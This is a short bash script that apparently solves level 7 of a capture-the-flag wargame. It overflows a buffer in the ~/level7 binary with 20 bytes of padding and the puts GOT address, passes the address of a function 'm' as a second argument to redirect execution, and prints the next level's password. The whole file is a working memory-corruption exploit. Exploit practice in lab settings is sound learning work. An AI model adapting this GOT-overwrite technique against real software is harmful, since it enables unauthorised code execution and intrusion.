#!/bin/bash

OFFSET=20
PUTS_ADDRESS="\x28\x99\x04\x08"
M_ADDRESS="\xf4\x84\x04\x08"

set -x
ARG1=`python -c "print 'A' * $OFFSET + '$PUTS_ADDRESS'"`
ARG2=`python -c "print '$M_ADDRESS'"`

set +x
PASS=`~/level7 $ARG1 $ARG2 | head -1`
echo -e "\nNext pass is:  $PASS\n"
